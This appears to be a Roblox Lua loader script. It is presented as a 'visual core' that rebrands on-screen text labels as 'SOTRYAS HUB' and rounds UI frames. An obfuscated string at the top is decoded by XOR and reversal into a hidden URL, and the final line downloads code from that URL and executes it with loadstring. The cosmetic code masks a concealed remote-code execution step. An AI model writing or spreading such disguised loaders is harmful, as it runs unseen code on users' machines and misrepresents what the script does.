
--[[ STAGE 2: VISUAL CORE ]]
local iV2JrFLHDYHU3tTe="\200\223\217\158\196\219\219\210\160\211\235\185\234\227\228\246\012\009\224\255\007\005\011\025\024\227\004\020\028\044\022\039\057\011\044\016\018\245\055\053\048\079\004\068\071\079\104\095\090\083\111\082\034\106\124\122\096\127\122\117\124\140\128\130\070\135\156\131\081\170\151\145\163\160\164\171\189\163\180\201\185\207\181\196\204\205\135\211\192\212\148\151\165\225\225\248\251\226"local fybRxyMsO7WFwmiNJ3d=136 local Bat8nIji8pZkJmlQOHbu_=203 local kUwELvSQce3cXFMZ=1 local PxB1nRTZMOS_Eo65Z3W=3 local vqIc7qRPkOSeO20rv=17 local WEMclYdsFF00l0=true local gl8aa6XDcSN9g=bit32 and bit32.bxor if not gl8aa6XDcSN9g then gl8aa6XDcSN9g=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local cZGY5vwp14cCR77slPQpbG={}for D1Jy0iIDIkK2=1,#iV2JrFLHDYHU3tTe do local Yb5MvYVrHQ9FWfPRgoPb=string.byte(iV2JrFLHDYHU3tTe,D1Jy0iIDIkK2)local JgqLwL9mEarlZqim2rYC=(Bat8nIji8pZkJmlQOHbu_+(D1Jy0iIDIkK2*PxB1nRTZMOS_Eo65Z3W)+vqIc7qRPkOSeO20rv)%256 if kUwELvSQce3cXFMZ==0 then Yb5MvYVrHQ9FWfPRgoPb=(Yb5MvYVrHQ9FWfPRgoPb-JgqLwL9mEarlZqim2rYC)%256 cZGY5vwp14cCR77slPQpbG[D1Jy0iIDIkK2]=string.char(gl8aa6XDcSN9g(Yb5MvYVrHQ9FWfPRgoPb,fybRxyMsO7WFwmiNJ3d))else Yb5MvYVrHQ9FWfPRgoPb=gl8aa6XDcSN9g(Yb5MvYVrHQ9FWfPRgoPb,fybRxyMsO7WFwmiNJ3d)cZGY5vwp14cCR77slPQpbG[D1Jy0iIDIkK2]=string.char((Yb5MvYVrHQ9FWfPRgoPb-JgqLwL9mEarlZqim2rYC)%256)end end local l8WKemd7oJwhzt8=table.concat(cZGY5vwp14cCR77slPQpbG)if WEMclYdsFF00l0 then l8WKemd7oJwhzt8=string.reverse(l8WKemd7oJwhzt8)end local JUeGUTEFmbUkOk9=l8WKemd7oJwhzt8
local HubName = "SOTRYAS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(JUeGUTEFmbUkOk9))()
